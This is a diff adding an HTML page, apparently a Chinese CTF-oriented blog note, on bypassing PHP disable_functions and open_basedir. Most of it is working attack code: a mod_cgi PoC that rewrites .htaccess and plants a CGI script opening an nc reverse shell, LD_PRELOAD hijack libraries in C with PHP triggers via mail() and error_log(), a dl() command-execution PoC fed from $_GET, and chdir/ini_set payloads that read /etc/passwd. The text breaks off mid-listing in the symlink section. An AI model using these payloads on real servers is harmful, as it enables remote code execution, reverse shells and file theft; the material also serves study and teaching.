@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Bypass disabled_functions &amp; open_basedir学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/&title=Bypass disabled_functions &amp; open_basedir学习" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/&title=Bypass disabled_functions &amp; open_basedir学习" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/&text=Bypass disabled_functions &amp; open_basedir学习" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bypass disabled_functions &amp; open_basedir学习&body=Check out this article: http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01前言"><span class="toc-number">1.</span> <span class="toc-text">0x 01前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02第二种：mod-cgi-bypass介绍"><span class="toc-number">2.</span> <span class="toc-text">0x 02第二种：mod_cgi bypass介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-第四种：-LD-PRELOAD-bypass介绍"><span class="toc-number">3.</span> <span class="toc-text">0x 03 第四种： LD_PRELOAD bypass介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">3.0.1.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#putenv可以设置环境变量"><span class="toc-number">3.0.2.</span> <span class="toc-text">putenv可以设置环境变量</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-其他bypass技巧介绍"><span class="toc-number">4.</span> <span class="toc-text">0x 04 其他bypass技巧介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#外部扩展库dl-bypass介绍"><span class="toc-number">4.1.</span> <span class="toc-text">外部扩展库dl bypass介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7-4-FFI-bypass介绍"><span class="toc-number">4.2.</span> <span class="toc-text">PHP7.4-FFI bypass介绍</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-两个常用的bypass链接"><span class="toc-number">5.</span> <span class="toc-text">0x 05 两个常用的bypass链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-Bypass-open-basedir"><span class="toc-number">6.</span> <span class="toc-text">0x 06 Bypass open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chdir-bypass"><span class="toc-number">6.1.</span> <span class="toc-text">chdir bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用symlink-函数来Bypass"><span class="toc-number">6.2.</span> <span class="toc-text">利用symlink()函数来Bypass</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Bypass disabled_functions &amp; open_basedir学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-21T15:05:29.000Z" itemprop="datePublished">2020-03-21</time>
+        
+        (Updated: <time datetime="2020-03-21T15:20:34.558Z" itemprop="dateModified">2020-03-21</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/tricks/">tricks</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Bypass-disabled-functions/" rel="tag">Bypass disabled_functions</a>, <a class="tag-link" href="/tags/Bypass-open-basedir/" rel="tag">Bypass open_basedir</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01前言"><a href="#0x-01前言" class="headerlink" title="0x 01前言"></a>0x 01前言</h3><p>​        常见的有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web  应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有  system()、exec()、shell_exec()、passthru()，偏僻 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改  .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD  劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
+<h3 id="0x-02第二种：mod-cgi-bypass介绍"><a href="#0x-02第二种：mod-cgi-bypass介绍" class="headerlink" title="0x 02第二种：mod_cgi bypass介绍"></a>0x 02第二种：mod_cgi bypass介绍</h3><p>关于mode_cgi，可以参考apache的官方说明：<a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html。" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html。</a></p>
+<blockquote>
+<p>“任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。”，这就表示，apache允许WEB服务器与可执行文件进行交互。</p>
+</blockquote>
+<p>满足条件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. apache环境</span><br><span class="line">2. mod_cgi已启用</span><br><span class="line">3. htaccess的文件必须被允许，即在httpd.conf中，要注意AllowOverride选项为All</span><br><span class="line">4. 你必须能够写入文件</span><br></pre></td></tr></table></figure>
+
+<p>攻击思路：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</p>
+<p>POC如下，附注释：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c'/bin/bash' 127.0.0.1 4444"</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line">$shellfile =<span class="string">"#!/bin/bash\n"</span>; <span class="comment">//指定shell</span></span><br><span class="line">$shellfile .=<span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line">$shellfile .=<span class="string">"$cmd"</span>; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ?$yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>]. <span class="string">'?checked=true'</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgienabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Iswritable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccessworking"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above mustbe true for the script to work!"</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">"Backing </span></span><br><span class="line"><span class="string">up.htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">"Write </span></span><br><span class="line"><span class="string">.htaccessfile"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shellfile"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//写入文件</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//给权限</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;"</span>; <span class="comment">//调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>具体攻击方法可以看这篇文章：<a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
+<h3 id="0x-03-第四种：-LD-PRELOAD-bypass介绍"><a href="#0x-03-第四种：-LD-PRELOAD-bypass介绍" class="headerlink" title="0x 03 第四种： LD_PRELOAD bypass介绍"></a>0x 03 第四种： LD_PRELOAD bypass介绍</h3><p>这里需要介绍一个前置知识：</p>
+<h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote>
+<p>LD_PRELOAD 是 Linux 下的一个环境变量,动态链接器在载入一个程序所需的所有动态库之前,首先会载入LD_PRELOAD 环境变量所指定的动态库。</p>
+</blockquote>
+<p>从上面可以看出本来LD_PRELOAD的作用是利用我们加载进来的so，去覆盖相同函数名的库函数，去使用自己的函数，更加方便，但是如果自己的函数为恶意函数，就造成了恶意程序注入。</p>
+<p>利用 putenv 设置LD_PRELOAD变量，既能绕过open basedir，又能绕过disable functions</p>
+<h5 id="putenv可以设置环境变量"><a href="#putenv可以设置环境变量" class="headerlink" title="putenv可以设置环境变量"></a>putenv可以设置环境变量</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure>
+
+<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>如果该函数未被过滤，那么我们可以有如下骚操作：</p>
+<p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library<br>4.成功进行RCE<br><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/2019-03-25-15-17-11.png" alt="img"></p>
+<p>对LD_PRELOAD的利用大概可分为两种，第一种是劫持库函数，第二种是劫持启动进程</p>
+<ul>
+<li>劫持库函数</li>
+</ul>
+<p>网上大多数都是劫持的getuid，其实能劫持的并不只getuid,我们需要劫持的函数需要满足，此函数为点：<strong>经常被用到的并且为无参数的函数</strong></p>
+<p>比如getuid,getpid,getgid,getppid这种，具体的可以fuzz一下，应该蛮多的</p>
+<p>具体操作过程(以geteuid的劫持为例)</p>
+<p>hack.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;whoami &gt; hack&quot;);</span><br><span class="line">&#125;   </span><br><span class="line">int  geteuid() &#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成so文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>
+
+<p>写一个hack.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);&#x2F;&#x2F;error_log(&#39;&#39;,1); </span><br><span class="line">&#x2F;&#x2F;imap_mail(&#39;a@a&#39;,1,1,1,1);</span><br><span class="line">&#x2F;&#x2F;$img &#x3D; new Imagick(&#39;test.wmv&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;mail()函数执行默认是会调用外部程序sendmail的</span><br></pre></td></tr></table></figure>
+
+<p>而既然要在php运行时被触发，那么势必选择一个非常常用的函数才行。这里能调用的函数不止有mail，在mail函数被ban掉的情况下也可以用error_log，imap_mail等，需要注意的是error_log的第二个参数需要设置为1表示发送邮件会调用sendmail进程，imap_mail也可调用sendmail进程，即可调用sendmail子进程，同样利用Imagick函数触发调用了新进程ffmpeg进行处理图像</p>
+<p>imap_mail()适用于<code>PHP &lt; 5.6.2</code>的</p>
+<p>使用Imagick函数的时候，MPEG format文件必须存在，否则无法调用<code>ffmpeg</code></p>
+<ul>
+<li>劫持启动进程</li>
+</ul>
+<p>从上面来看，劫持库函数需要找到特定的库函数去劫持，那么劫持新进程是不需要找到特定的库函数的。</p>
+<blockquote>
+<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
+</blockquote>
+<p><strong>attribute</strong>((constructor))更加直接的去讲：有这个说明：</p>
+<p><strong>它是在加载共享库时运行的，通常是在程序启动过程中</strong>，也就是当有一个新进程/子进程启动时，那么<strong>attribute</strong>((constructor))就会被直接加载，我们上面的mail等函数也正好符合这个特性，下面也接着来试一下:</p>
+<p>hack.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hack.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">error_log(&#39;&#39;,1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-04-其他bypass技巧介绍"><a href="#0x-04-其他bypass技巧介绍" class="headerlink" title="0x 04 其他bypass技巧介绍"></a>0x 04 其他bypass技巧介绍</h3><h4 id="外部扩展库dl-bypass介绍"><a href="#外部扩展库dl-bypass介绍" class="headerlink" title="外部扩展库dl bypass介绍"></a>外部扩展库dl bypass介绍</h4><blockquote>
+<p>实现方法参考：<a href="https://cloud.tencent.com/developer/article/1141142" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1141142</a></p>
+</blockquote>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>7.0.0</td>
+<td>PHP-FPM 模式下已禁用 <strong>dl()</strong>。</td>
+</tr>
+<tr>
+<td>5.3.9</td>
+<td>尽管不推荐，但 PHP-FPM 模式下启用了 <strong>dl()</strong>。</td>
+</tr>
+<tr>
+<td>5.3.0</td>
+<td>由于稳定性，<strong>dl()</strong> 在某些 SAPI 中被禁用。仅仅允许 <strong>dl()</strong> 的 SAPI 为 CLI 和 Embed。 使用 <a href="https://www.php.net/manual/zh/ini.core.php#ini.extension" target="_blank" rel="noopener">扩展加载指令</a> 作为替代。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<blockquote>
+<p>SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。</p>
+<p>SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server API FPM&#x2F;FastCGI</span><br></pre></td></tr></table></figure>
+
+<p>条件：php.ini中需设置enable_dl=true</p>
+<p>dl bypass-poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpdl(&quot;dl.so&quot;);  &#x2F;&#x2F;dl.so在extension_dir目录，如不在则用..&#x2F;..&#x2F;来实现调用confirm_dl_compiled(&quot;$_GET[a]&gt;;1.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>主要就是dl.so这个文件的搜索，通过调用dl.so进行命令执行。</p>
+<h4 id="PHP7-4-FFI-bypass介绍"><a href="#PHP7-4-FFI-bypass介绍" class="headerlink" title="PHP7.4-FFI bypass介绍"></a>PHP7.4-FFI bypass介绍</h4><p>在RCTF2019中出的题，考察了php7.4的新特性，通过新加的FFI即可bypass disable function</p>
+<p>参考RCTF2019RCTF 2019 nextphp <a href="https://xz.aliyun.com/t/5218" target="_blank" rel="noopener">https://xz.aliyun.com/t/5218</a></p>
+<h3 id="0x-05-两个常用的bypass链接"><a href="#0x-05-两个常用的bypass链接" class="headerlink" title="0x 05 两个常用的bypass链接"></a>0x 05 两个常用的bypass链接</h3><blockquote>
+<p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">some exploits in php7</a></p>
+<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass disable_functions via LD_PRELOAD</a> 利用劫持启动进程+mail()函数实现</p>
+</blockquote>
+<h3 id="0x-06-Bypass-open-basedir"><a href="#0x-06-Bypass-open-basedir" class="headerlink" title="0x 06 Bypass open_basedir"></a>0x 06 Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读配置文件cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file_get_contents(&quot;&#x2F;etc&#x2F;passwd&quot;));</span><br><span class="line">列目录cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">读文件md&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);readfile(&quot;&#x2F;THis_Is_tHe_F14g&quot;));</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用symlink-函数来Bypass"><a href="#利用symlink-函数来Bypass" class="headerlink" title="利用symlink()函数来Bypass"></a>利用symlink()函数来Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 